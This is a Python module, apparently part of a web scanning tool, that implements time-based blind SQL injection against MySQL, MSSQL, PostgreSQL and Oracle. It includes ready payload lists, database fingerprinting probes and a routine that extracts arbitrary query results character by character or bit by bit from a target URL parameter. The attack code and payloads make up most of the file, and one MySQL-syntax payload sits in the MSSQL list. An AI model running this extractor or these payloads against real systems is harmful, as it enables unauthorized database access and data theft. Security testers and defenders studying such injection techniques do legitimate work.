"""
Time-Based Blind SQL Injection Detector

Implements time-delay techniques to infer database information by monitoring
server response times. Used when neither error messages nor content changes
are observable.

References:
- Chris Anley (NGSSoftware)
- Sherief Hammad (NGSSoftware) 
- Dafydd Stuttard & Marcus Pinto - "The Web Application Hacker's Handbook"
"""

import logging
import time
import statistics
from typing import Dict, List, Optional, Tuple, Any, Callable
from dataclasses import dataclass
from enum import Enum

logger = logging.getLogger(__name__)


class DBMSType(Enum):
    """Supported database management systems"""
    MYSQL = "mysql"
    MSSQL = "mssql"
    POSTGRESQL = "postgresql"
    ORACLE = "oracle"
    UNKNOWN = "unknown"


@dataclass
class TimingResult:
    """Result of a timing-based test"""
    payload: str
    response_time: float
    baseline_time: float
    time_difference: float
    is_delayed: bool
    confidence: float


class TimeBasedBlindDetector:
    """
    Advanced detector for time-based blind SQL injection using
    conditional time delays to infer database information.
    """
    
    # Time-delay payloads for different databases
    # These payloads induce conditional delays based on true/false conditions
    TIME_DELAY_PAYLOADS = {
        DBMSType.MSSQL: {
            'simple_delay': [
                # Basic WAITFOR DELAY tests
                "'; WAITFOR DELAY '0:0:5'--",
                "' WAITFOR DELAY '0:0:5'--",
                "1; WAITFOR DELAY '0:0:5'--",
                "1 WAITFOR DELAY '0:0:5'--",
            ],
            'conditional_delay': [
                # Conditional delays (if condition is true, delay)
                "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
                "' IF (SELECT user) = 'sa' WAITFOR DELAY '0:0:5'--",
                "' AND IF(1=1, (SELECT SLEEP(5)), 0)--",  # Alternative syntax
            ],
            'conditional_no_delay': [
                # Conditional no delays (if condition is false, no delay)
                "'; IF (1=2) WAITFOR DELAY '0:0:5'--",
                "' IF (SELECT user) = 'nonexistent' WAITFOR DELAY '0:0:5'--",
            ],
            'extraction_template': {
                'char_test': "' IF ASCII(SUBSTRING(({query}),{position},1))={ascii_code} WAITFOR DELAY '0:0:{delay}'--",
                'length_test': "' IF LEN({query})={length} WAITFOR DELAY '0:0:{delay}'--",
                'exists_test': "' IF EXISTS({query}) WAITFOR DELAY '0:0:{delay}'--",
                'bitwise_test': "' IF ASCII(SUBSTRING(({query}),{position},1))&{mask}={value} WAITFOR DELAY '0:0:{delay}'--",
            },
        },
        DBMSType.MYSQL: {
            'simple_delay': [
                # Basic SLEEP tests
                "'; SELECT SLEEP(5)--",
                "' AND SLEEP(5)--",
                "1 AND SLEEP(5)--",
                "' OR SLEEP(5)--",
            ],
            'conditional_delay': [
                # Conditional delays using IF and SLEEP
                "' AND IF(1=1, SLEEP(5), 0)--",
                "' AND IF((SELECT user())='root', SLEEP(5), 0)--",
                "' OR IF(1=1, SLEEP(5), 0)--",
            ],
            'conditional_no_delay': [
                # Conditional no delays
                "' AND IF(1=2, SLEEP(5), 0)--",
                "' AND IF((SELECT user())='nonexistent', SLEEP(5), 0)--",
            ],
            'benchmark_delay': [
                # BENCHMARK for older MySQL versions without SLEEP
                "' AND BENCHMARK(5000000, MD5('test'))--",
                "' OR BENCHMARK(5000000, SHA1('test'))--",
            ],
            'extraction_template': {
                'char_test': "' AND IF(ASCII(SUBSTRING(({query}),{position},1))={ascii_code}, SLEEP({delay}), 0)--",
                'length_test': "' AND IF(LENGTH({query})={length}, SLEEP({delay}), 0)--",
                'exists_test': "' AND IF(EXISTS({query}), SLEEP({delay}), 0)--",
                'bitwise_test': "' AND IF(ASCII(SUBSTRING(({query}),{position},1))&{mask}={value}, SLEEP({delay}), 0)--",
                'benchmark_char_test': "' AND IF(ASCII(SUBSTRING(({query}),{position},1))={ascii_code}, BENCHMARK(5000000, MD5('test')), 0)--",
            },
        },
        DBMSType.POSTGRESQL: {
            'simple_delay': [
                # Basic pg_sleep tests
                "'; SELECT pg_sleep(5)--",
                "' AND pg_sleep(5)--",
                "1 AND pg_sleep(5)--",
                "' OR pg_sleep(5)--",
            ],
            'conditional_delay': [
                # Conditional delays using CASE
                "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
                "' AND (SELECT CASE WHEN (current_user='postgres') THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
            ],
            'conditional_no_delay': [
                # Conditional no delays
                "' AND (SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
            ],
            'extraction_template': {
                'char_test': "' AND (SELECT CASE WHEN ASCII(SUBSTRING(({query}),{position},1))={ascii_code} THEN pg_sleep({delay}) ELSE pg_sleep(0) END)--",
                'length_test': "' AND (SELECT CASE WHEN LENGTH({query})={length} THEN pg_sleep({delay}) ELSE pg_sleep(0) END)--",
                'exists_test': "' AND (SELECT CASE WHEN EXISTS({query}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END)--",
                'bitwise_test': "' AND (SELECT CASE WHEN (ASCII(SUBSTRING(({query}),{position},1))&{mask})={value} THEN pg_sleep({delay}) ELSE pg_sleep(0) END)--",
            },
        },
        DBMSType.ORACLE: {
            'simple_delay': [
                # Using UTL_HTTP to create timeouts
                "' AND (SELECT UTL_HTTP.request('http://nonexistent-domain-for-sqli-test-12345.com') FROM dual)='x'--",
                "' OR (SELECT UTL_HTTP.request('http://192.0.2.1:81/') FROM dual)='x'--",
            ],
            'conditional_delay': [
                # Conditional delays using CASE and UTL_HTTP
                "' AND (SELECT CASE WHEN (1=1) THEN UTL_HTTP.request('http://nonexistent-domain-for-sqli-test-12345.com') ELSE 'ok' END FROM dual)='ok'--",
                "' AND (SELECT CASE WHEN (user='SYS') THEN UTL_HTTP.request('http://192.0.2.1:81/') ELSE 'ok' END FROM dual)='ok'--",
            ],
            'conditional_no_delay': [
                # Conditional no delays
                "' AND (SELECT CASE WHEN (1=2) THEN UTL_HTTP.request('http://nonexistent-domain-for-sqli-test-12345.com') ELSE 'ok' END FROM dual)='ok'--",
            ],
            'dbms_lock_delay': [
                # Alternative: Using DBMS_LOCK.SLEEP (requires privileges)
                "' AND (SELECT DBMS_LOCK.SLEEP(5) FROM dual)='x'--",
            ],
            'extraction_template': {
                'char_test': "' AND (SELECT CASE WHEN ASCII(SUBSTR(({query}),{position},1))={ascii_code} THEN UTL_HTTP.request('http://192.0.2.1:81/') ELSE 'ok' END FROM dual)='ok'--",
                'length_test': "' AND (SELECT CASE WHEN LENGTH({query})={length} THEN UTL_HTTP.request('http://192.0.2.1:81/') ELSE 'ok' END FROM dual)='ok'--",
                'exists_test': "' AND (SELECT CASE WHEN EXISTS({query}) THEN UTL_HTTP.request('http://192.0.2.1:81/') ELSE 'ok' END FROM dual)='ok'--",
                'bitwise_test': "' AND (SELECT CASE WHEN BITAND(ASCII(SUBSTR(({query}),{position},1)),{mask})={value} THEN UTL_HTTP.request('http://192.0.2.1:81/') ELSE 'ok' END FROM dual)='ok'--",
                'dbms_lock_char_test': "' AND (SELECT CASE WHEN ASCII(SUBSTR(({query}),{position},1))={ascii_code} THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM dual) IS NOT NULL--",
            },
        },
    }
    
    # Detection probes to identify database backend
    DETECTION_PROBES = {
        DBMSType.MYSQL: [
            "' AND SLEEP(1)--",
            "' OR SLEEP(1)='1",
            "1 AND SLEEP(1)",
        ],
        DBMSType.MSSQL: [
            "'; WAITFOR DELAY '0:0:1'--",
            "' WAITFOR DELAY '0:0:1'--",
        ],
        DBMSType.POSTGRESQL: [
            "'; SELECT pg_sleep(1)--",
            "' AND pg_sleep(1)::text='0'--",
        ],
        DBMSType.ORACLE: [
            "' AND DBMS_LOCK.SLEEP(1) IS NULL--",
            # Note: UTL_HTTP probes may not be suitable for detection due to unpredictable timeout
        ],
    }
    
    def __init__(self, delay_seconds: float = 5.0, threshold_multiplier: float = 0.8,
                 baseline_samples: int = 3, test_samples: int = 3):
        """
        Initialize time-based blind detector.
        
        Args:
            delay_seconds: Expected delay in seconds for time-based payloads
            threshold_multiplier: Multiplier for delay threshold (0.8 = 80% of expected delay)
            baseline_samples: Number of baseline measurements to establish normal response time
            test_samples: Number of test measurements per payload
        """
        self.delay_seconds = delay_seconds
        self.threshold_multiplier = threshold_multiplier
        self.baseline_samples = baseline_samples
        self.test_samples = test_samples
        
        self.baseline_times: List[float] = []
        self.detected_dbms: Optional[DBMSType] = None
        
        logger.info(f"Time-based blind detector initialized: delay={delay_seconds}s, "
                   f"threshold={threshold_multiplier}, samples={baseline_samples}/{test_samples}")
    
    def establish_baseline(self, test_function: Callable, **kwargs) -> float:
        """
        Establish baseline response time for normal requests.
        
        Args:
            test_function: Function to make test requests (should return response or timing)
            **kwargs: Additional arguments to pass to test_function
        
        Returns:
            Average baseline response time
        """
        self.baseline_times = []
        
        logger.info(f"Establishing baseline with {self.baseline_samples} samples...")
        
        for i in range(self.baseline_samples):
            start_time = time.time()
            try:
                # Make normal request (no injection)
                test_function(payload=None, **kwargs)
                elapsed = time.time() - start_time
                self.baseline_times.append(elapsed)
                logger.debug(f"Baseline sample {i+1}: {elapsed:.3f}s")
            except Exception as e:
                logger.warning(f"Baseline measurement {i+1} failed: {e}")
                continue
        
        if not self.baseline_times:
            logger.error("Failed to establish baseline")
            return 0.0
        
        avg_baseline = statistics.mean(self.baseline_times)
        std_baseline = statistics.stdev(self.baseline_times) if len(self.baseline_times) > 1 else 0.0
        
        logger.info(f"Baseline established: mean={avg_baseline:.3f}s, std={std_baseline:.3f}s")
        return avg_baseline
    
    def measure_response_time(self, test_function: Callable, payload: str, **kwargs) -> float:
        """
        Measure response time for a specific payload.
        
        Args:
            test_function: Function to make test requests
            payload: SQL injection payload
            **kwargs: Additional arguments
        
        Returns:
            Response time in seconds
        """
        start_time = time.time()
        try:
            test_function(payload=payload, **kwargs)
            elapsed = time.time() - start_time
            return elapsed
        except Exception as e:
            logger.debug(f"Request with payload failed: {e}")
            return time.time() - start_time
    
    def is_delayed_response(self, response_time: float, baseline: Optional[float] = None) -> Tuple[bool, float]:
        """
        Determine if response time indicates a time-based delay.
        
        Args:
            response_time: Measured response time
            baseline: Baseline response time (uses average if not provided)
        
        Returns:
            Tuple of (is_delayed, confidence)
        """
        if baseline is None:
            if not self.baseline_times:
                logger.warning("No baseline established")
                return False, 0.0
            baseline = statistics.mean(self.baseline_times)
        
        # Expected delay threshold
        expected_delay = self.delay_seconds * self.threshold_multiplier
        time_difference = response_time - baseline
        
        # Check if time difference meets threshold
        is_delayed = time_difference >= expected_delay
        
        # Calculate confidence based on how much the delay exceeds threshold
        if is_delayed:
            # Confidence increases with delay magnitude
            confidence = min(1.0, time_difference / self.delay_seconds)
        else:
            confidence = 0.0
        
        logger.debug(f"Response time: {response_time:.3f}s, baseline: {baseline:.3f}s, "
                    f"difference: {time_difference:.3f}s, threshold: {expected_delay:.3f}s, "
                    f"is_delayed: {is_delayed}, confidence: {confidence:.2f}")
        
        return is_delayed, confidence
    
    def detect_database_backend(self, test_function: Callable, **kwargs) -> Optional[DBMSType]:
        """
        Detect database backend using time-based probes.
        
        Args:
            test_function: Function to make test requests
            **kwargs: Additional arguments
        
        Returns:
            Detected DBMSType or None
        """
        logger.info("Detecting database backend using time-based probes...")
        
        if not self.baseline_times:
            logger.warning("No baseline established, establishing now...")
            self.establish_baseline(test_function, **kwargs)
        
        baseline = statistics.mean(self.baseline_times)
        
        # Test each database type
        for dbms_type in [DBMSType.MYSQL, DBMSType.MSSQL, DBMSType.POSTGRESQL, DBMSType.ORACLE]:
            probes = self.DETECTION_PROBES.get(dbms_type, [])
            
            for probe in probes:
                logger.debug(f"Testing {dbms_type.value} with probe: {probe[:50]}...")
                
                # Test multiple times for reliability
                delayed_count = 0
                for _ in range(2):
                    response_time = self.measure_response_time(test_function, probe, **kwargs)
                    is_delayed, confidence = self.is_delayed_response(response_time, baseline)
                    
                    if is_delayed and confidence > 0.7:
                        delayed_count += 1
                
                # If majority of tests show delay, we found the DBMS
                if delayed_count >= 1:
                    logger.info(f"✓ Database backend detected: {dbms_type.value}")
                    self.detected_dbms = dbms_type
                    return dbms_type
        
        logger.info("Could not definitively detect database backend")
        return None
    
    def test_time_based_injection(self, test_function: Callable, url: str, param: str,
                                  param_type: str, dbms_type: Optional[DBMSType] = None,
                                  **kwargs) -> Dict[str, Any]:
        """
        Test for time-based blind SQL injection vulnerability.
        
        Args:
            test_function: Function to make test requests
            url: Target URL
            param: Parameter to test
            param_type: Parameter type (GET/POST)
            dbms_type: Database type (auto-detect if None)
            **kwargs: Additional request parameters
        
        Returns:
            Detection results dictionary
        """
        results = {
            'vulnerable': False,
            'confidence': 0.0,
            'method': 'time_based_blind',
            'evidence': [],
            'dbms_type': None,
            'avg_baseline': 0.0,
            'avg_delayed': 0.0,
            'time_difference': 0.0,
        }
        
        logger.info(f"Testing time-based blind injection on parameter: {param}")
        
        # Establish baseline if needed
        if not self.baseline_times:
            self.establish_baseline(test_function, url=url, param=param, param_type=param_type, **kwargs)
        
        if not self.baseline_times:
            logger.error("Failed to establish baseline")
            return results
        
        avg_baseline = statistics.mean(self.baseline_times)
        results['avg_baseline'] = avg_baseline
        
        # Detect or use provided DBMS type
        if dbms_type is None:
            dbms_type = self.detect_database_backend(test_function, url=url, param=param, 
                                                     param_type=param_type, **kwargs)
            if dbms_type is None:
                # Try all database types
                dbms_type = DBMSType.MYSQL  # Default fallback
        
        results['dbms_type'] = dbms_type.value if dbms_type else None
        
        # Get payloads for detected DBMS
        payloads_dict = self.TIME_DELAY_PAYLOADS.get(dbms_type, {})
        
        # Test conditional delay payloads (should delay)
        conditional_delay_payloads = payloads_dict.get('conditional_delay', [])
        delayed_times = []
        
        for payload in conditional_delay_payloads[:3]:  # Test first 3 payloads
            logger.debug(f"Testing conditional delay payload: {payload[:50]}...")
            
            for _ in range(self.test_samples):
                response_time = self.measure_response_time(
                    test_function, payload, url=url, param=param, 
                    param_type=param_type, **kwargs
                )
                delayed_times.append(response_time)
        
        # Test conditional no-delay payloads (should not delay)
        conditional_no_delay_payloads = payloads_dict.get('conditional_no_delay', [])
        no_delay_times = []
        
        for payload in conditional_no_delay_payloads[:2]:  # Test first 2 payloads
            logger.debug(f"Testing conditional no-delay payload: {payload[:50]}...")
            
            for _ in range(self.test_samples):
                response_time = self.measure_response_time(
                    test_function, payload, url=url, param=param,
                    param_type=param_type, **kwargs
                )
                no_delay_times.append(response_time)
        
        if not delayed_times:
            logger.info("No delayed responses captured")
            return results
        
        # Analyze results
        avg_delayed = statistics.mean(delayed_times)
        results['avg_delayed'] = avg_delayed
        
        avg_no_delay = statistics.mean(no_delay_times) if no_delay_times else avg_baseline
        time_difference = avg_delayed - avg_baseline
        results['time_difference'] = time_difference
        
        # Check if we have significant delay
        expected_delay = self.delay_seconds * self.threshold_multiplier
        
        # Count how many delayed responses meet threshold
        delayed_count = sum(1 for t in delayed_times if t - avg_baseline >= expected_delay)
        delay_ratio = delayed_count / len(delayed_times) if delayed_times else 0
        
        # Count how many no-delay responses don't meet threshold
        no_delay_count = sum(1 for t in no_delay_times if t - avg_baseline < expected_delay) if no_delay_times else 0
        no_delay_ratio = no_delay_count / len(no_delay_times) if no_delay_times else 0
        
        logger.info(f"Delay analysis: avg_baseline={avg_baseline:.3f}s, avg_delayed={avg_delayed:.3f}s, "
                   f"time_diff={time_difference:.3f}s, delay_ratio={delay_ratio:.2f}, "
                   f"no_delay_ratio={no_delay_ratio:.2f}")
        
        # Detection logic: need both conditions to be true
        # 1. Delayed payloads should cause delay
        # 2. No-delay payloads should not cause delay (optional check)
        if delay_ratio >= 0.6 and time_difference >= expected_delay:
            results['vulnerable'] = True
            results['confidence'] = min(0.95, delay_ratio * 0.7 + (time_difference / self.delay_seconds) * 0.3)
            
            results['evidence'].append({
                'description': 'Time-based delay detected',
                'avg_baseline': avg_baseline,
                'avg_delayed': avg_delayed,
                'time_difference': time_difference,
                'delay_ratio': delay_ratio,
                'no_delay_ratio': no_delay_ratio,
            })
            
            logger.info(f"✓ Time-based blind SQLi detected! Confidence: {results['confidence']:.2f}")
        else:
            logger.info("No significant time-based delay detected")
        
        return results
    
    def extract_data_via_time_delays(self, test_function: Callable, url: str, param: str,
                                    param_type: str, query: str, 
                                    dbms_type: Optional[DBMSType] = None,
                                    max_length: int = 50, use_bitwise: bool = False,
                                    **kwargs) -> Optional[str]:
        """
        Extract data using time-based blind SQL injection (character-by-character or bitwise).
        
        Args:
            test_function: Function to make test requests
            url: Target URL
            param: Vulnerable parameter
            param_type: Parameter type
            query: SQL query to extract (e.g., 'database()', 'user()')
            dbms_type: Database type (auto-detect if None)
            max_length: Maximum length to extract
            use_bitwise: Use bitwise extraction (more efficient)
            **kwargs: Additional parameters
        
        Returns:
            Extracted data or None
        """
        if not self.baseline_times:
            logger.warning("No baseline established")
            return None
        
        # Use detected DBMS or provided one
        if dbms_type is None:
            dbms_type = self.detected_dbms or DBMSType.MYSQL
        
        logger.info(f"Starting time-based extraction for: {query} (DBMS: {dbms_type.value}, "
                   f"bitwise: {use_bitwise})")
        
        templates = self.TIME_DELAY_PAYLOADS.get(dbms_type, {}).get('extraction_template', {})
        if not templates:
            logger.error(f"No extraction templates for {dbms_type.value}")
            return None
        
        avg_baseline = statistics.mean(self.baseline_times)
        expected_delay_threshold = self.delay_seconds * self.threshold_multiplier
        
        extracted = ""
        
        if use_bitwise:
            # Bitwise extraction (8 tests per character instead of 95)
            for position in range(1, max_length + 1):
                ascii_value = 0
                
                # Test each bit (7 bits for ASCII printable characters)
                for bit in range(7, -1, -1):
                    mask = 1 << bit
                    
                    # Build bitwise test payload
                    payload_template = templates.get('bitwise_test')
                    if not payload_template:
                        logger.warning("No bitwise template, falling back to char extraction")
                        use_bitwise = False
                        break
                    
                    payload = payload_template.format(
                        query=query,
                        position=position,
                        mask=mask,
                        value=mask,
                        delay=int(self.delay_seconds)
                    )
                    
                    # Measure response time
                    response_time = self.measure_response_time(
                        test_function, payload, url=url, param=param,
                        param_type=param_type, **kwargs
                    )
                    
                    is_delayed, _ = self.is_delayed_response(response_time, avg_baseline)
                    
                    if is_delayed:
                        ascii_value |= mask
                
                if not use_bitwise:
                    break  # Fall back to character extraction
                
                if ascii_value == 0:
                    # End of string
                    break
                
                char = chr(ascii_value)
                extracted += char
                logger.info(f"Position {position}: extracted '{char}' (ASCII {ascii_value}) - Total: {extracted}")
        
        if not use_bitwise:
            # Character-by-character extraction (ASCII 32-126)
            for position in range(1, max_length + 1):
                found_char = None
                
                for ascii_code in range(32, 127):
                    # Build character test payload
                    payload_template = templates.get('char_test')
                    if not payload_template:
                        logger.error("No char_test template available")
                        return extracted if extracted else None
                    
                    payload = payload_template.format(
                        query=query,
                        position=position,
                        ascii_code=ascii_code,
                        delay=int(self.delay_seconds)
                    )
                    
                    # Measure response time
                    response_time = self.measure_response_time(
                        test_function, payload, url=url, param=param,
                        param_type=param_type, **kwargs
                    )
                    
                    is_delayed, confidence = self.is_delayed_response(response_time, avg_baseline)
                    
                    if is_delayed and confidence > 0.7:
                        found_char = chr(ascii_code)
                        logger.debug(f"Position {position}: found '{found_char}' (ASCII {ascii_code})")
                        break
                
                if found_char:
                    extracted += found_char
                    logger.info(f"Extracted: {extracted}")
                else:
                    # No more characters
                    break
        
        logger.info(f"Extraction complete: {extracted}")
        return extracted if extracted else None
    
    def generate_report(self) -> str:
        """Generate report for time-based blind detection."""
        report = []
        report.append("=" * 60)
        report.append("TIME-BASED BLIND SQL INJECTION REPORT")
        report.append("=" * 60)
        
        if self.baseline_times:
            avg_baseline = statistics.mean(self.baseline_times)
            report.append(f"\nBaseline Response Time: {avg_baseline:.3f}s")
            report.append(f"Baseline Samples: {len(self.baseline_times)}")
        
        if self.detected_dbms:
            report.append(f"\nDetected Database: {self.detected_dbms.value.upper()}")
        
        report.append(f"\nExpected Delay: {self.delay_seconds}s")
        report.append(f"Detection Threshold: {self.delay_seconds * self.threshold_multiplier:.3f}s")
        
        report.append("=" * 60)
        return "\n".join(report)
